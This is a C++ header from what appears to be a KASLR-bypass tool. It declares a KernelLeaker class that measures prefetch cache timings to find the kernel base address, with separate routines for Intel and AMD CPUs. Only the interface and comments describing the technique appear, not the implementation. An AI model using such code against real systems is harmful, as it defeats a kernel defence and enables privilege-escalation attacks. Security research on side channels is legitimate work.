#pragma once

#include "PrefetchTool.h"
#include <array>
#include <optional>
#include <cstdint>

namespace kaslr {

    // Implements cache-timing side-channel attacks to defeat KASLR
    // Exploits microarchitectural differences in MMU behavior for
    // mapped vs unmapped virtual addresses
    class KernelLeaker {
    public:
        explicit KernelLeaker(int verbose = 1);
        
        // Primary interface - returns kernel base address or nullopt on failure
        [[nodiscard]] std::optional<uint64_t> leak_kernel_base_reliable();
        
        // Debug utility - prints raw timing measurements for all probed addresses
        void print_timings() const;

    private:
        CpuVendor vendor_;
        mutable uint32_t avg_timing_ = 0;  // Cached average for current measurement batch
        int verbose_;

        // CPU vendor detection via processor brand string query
        [[nodiscard]] static CpuVendor detect_cpu_vendor();
        
        // Low-level timing collection
        [[nodiscard]] int average_sidechannel(void* addr) const;
        [[nodiscard]] std::array<uint64_t, config::ARRAY_SIZE> collect_timings() const;
        
        // Statistical analysis - finds mode (most frequent value) in dataset
        // Critical for filtering noise in bimodal distributions
        [[nodiscard]] static uint64_t calculate_most_frequent(
            const std::array<uint64_t, config::ARRAY_SIZE>& data);
        
        // Architecture-specific leak implementations
        // Intel: Low timings indicate mapped pages (fast prefetch)
        // AMD: High timings indicate mapped pages (speculative access penalty)
        [[nodiscard]] std::optional<uint64_t> leak_intel() const;
        [[nodiscard]] std::optional<uint64_t> leak_intel_n200() const;
        [[nodiscard]] std::optional<uint64_t> leak_amd() const;
        [[nodiscard]] std::optional<uint64_t> leak_amd_mobile() const;
        
        // NEW: Simple Intel leak that finds absolute minimum timing
        [[nodiscard]] std::optional<uint64_t> leak_intel_simple() const;
        
        // Reliability wrapper - retries until consensus is reached
        [[nodiscard]] std::optional<uint64_t> leak_with_retry(
            std::optional<uint64_t> (KernelLeaker::*leak_fn)() const) const;
        
        // Address space helpers
        [[nodiscard]] static constexpr uint64_t index_to_address(size_t idx) noexcept {
            return config::KERNEL_LOWER_BOUND + (idx * config::STEP);
        }
        
        [[nodiscard]] static constexpr size_t address_to_index(uint64_t addr) noexcept {
            return (addr - config::KERNEL_LOWER_BOUND) / config::STEP;
        }
    };

} // namespace kaslr